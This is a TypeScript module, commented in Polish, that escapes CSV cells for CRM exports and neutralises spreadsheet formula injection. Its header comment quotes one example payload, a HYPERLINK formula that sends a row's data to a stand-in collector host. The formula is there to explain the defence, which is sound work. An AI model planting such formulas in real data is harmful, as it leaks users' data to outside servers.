// Serializacja komórek CSV dla eksportów CRM - jedno źródło prawdy.
//
// DLACZEGO OSOBNY MODUŁ. Ten sam escaper stał dotąd WKLEJONY dwa razy
// w `crm.functions.ts` (eksport listy leadów i eksport kroniki leada), a trzeci
// eksport - lista firm w `companyViews.rowsToCsv` - miał własną, UBOŻSZĄ wersję
// bez neutralizacji formuł. Trzy kopie jednej reguły bezpieczeństwa to nie
// powtórzenie kodu, tylko trzy różne poziomy ochrony w jednym panelu.
//
// CO NEUTRALIZUJEMY I DLACZEGO TO NIE JEST KOSMETYKA.
//
//   1. WSTRZYKNIĘCIE FORMUŁY. Arkusz (Excel, Sheets, LibreOffice) traktuje
//      komórkę zaczynającą się od `=`, `+`, `-`, `@`, tabulatora albo CR jako
//      FORMUŁĘ i wykonuje ją przy otwarciu pliku. Dane w tych eksportach są
//      w całości dostarczone z zewnątrz: nazwa firmy z importu CSV, nazwisko
//      z formularza kontaktowego, `detail` zdarzenia z integracji partnerskiej.
//      Napastnik nie potrzebuje żadnego dostępu do panelu - wystarczy, że jego
//      nazwa firmy brzmi `=HYPERLINK("https://zbieram.example/?d="&A1;"Faktura")`,
//      a operator, który eksportuje listę i otwiera ją w arkuszu, sam wysyła
//      zawartość wiersza na cudzy serwer. Prefiks apostrofa wymusza render
//      literalny i jest standardową mitygacją (OWASP: CSV Injection).
//
//   2. UCIECZKA Z KOMÓRKI. Cudzysłów, przecinek, średnik i każdy znak nowej
//      linii (LF, CR, CRLF) muszą wylądować w cudzysłowach, inaczej jedna
//      wartość rozsypuje się na kilka kolumn albo kilka wierszy. Średnik jest
//      w zestawie, bo polska lokalizacja Excela czyta CSV z separatorem `;`
//      i bez cytowania wartość z średnikiem rozjeżdża wiersz mimo poprawnego
//      pliku RFC 4180. CR jest w zestawie, bo `\r` bez `\n` też kończy wiersz
//      w większości parserów - poprzednie wersje escapera go nie widziały.
//
// Kolejność ma znaczenie: NAJPIERW apostrof, POTEM cytowanie. Odwrotnie
// apostrof wylądowałby poza cudzysłowami i sam nie byłby chroniony.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /["\n\r,;]/;

/**
 * Wartość komórki.
 *
 * `unknown`, nie zamknięta unia - i to jest wybór, nie ustępstwo. Wiersze do
 * eksportu przychodzą z `Record<string, unknown>` (odpowiedź RPC), więc każda
 * węższa sygnatura wymuszałaby u wołającego rzutowanie - a rzutowanie na
 * granicy z bazą jest dokładnie tym, co obchodzi kontrolę typów i czego bramka
 * `check:db-row-casts` pilnuje w drugą stronę. Funkcja i tak radzi sobie
 * z każdym kształtem (patrz `renderValue`), więc uczciwym typem jest ten,
 * który to odzwierciedla.
 */
export type CsvCellValue = unknown;

/**
 * Jedna komórka CSV: neutralizacja formuły + ucieczka z komórki.
 *
 * Tablice sklejamy pionową kreską (tagi leada), obiekty przez `JSON.stringify`
 * (`meta` zdarzenia) - oba kształty występują w istniejących eksportach i oba
 * przechodzą potem tę samą neutralizację, bo `JSON.stringify` potrafi zwrócić
 * tekst zaczynający się od znaku formuły.
 */
export function csvCell(value: CsvCellValue): string {
  if (value === null || value === undefined) return "";
  const raw = renderValue(value);
  if (raw === "") return "";
  const guarded = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
  return NEEDS_QUOTING.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

function renderValue(value: CsvCellValue): string {
  if (Array.isArray(value)) return value.map((item) => renderValue(item)).join("|");
  if (typeof value === "object") return JSON.stringify(value);
  return String(value);
}

/** Jeden wiersz CSV - komórki rozdzielone przecinkiem, każda przez `csvCell`. */
export function csvRow(cells: ReadonlyArray<CsvCellValue>): string {
  return cells.map((cell) => csvCell(cell)).join(",");
}

/**
 * Cały dokument: nagłówek + wiersze rozdzielone LF.
 *
 * LF, nie CRLF - świadomie ZGODNIE z tym, co robiły wszystkie trzy eksporty
 * przed konsolidacją. Separator wiersza nie ma wpływu na bezpieczeństwo,
 * a zmiana go przy okazji tego refaktoru byłaby zmianą zachowania bez powodu
 * (trasy dokładają BOM, więc Excel i tak czyta te pliki poprawnie).
 */
export function csvDocument(
  header: ReadonlyArray<CsvCellValue>,
  rows: ReadonlyArray<ReadonlyArray<CsvCellValue>>,
): string {
  return [csvRow(header), ...rows.map((row) => csvRow(row))].join("\n");
}
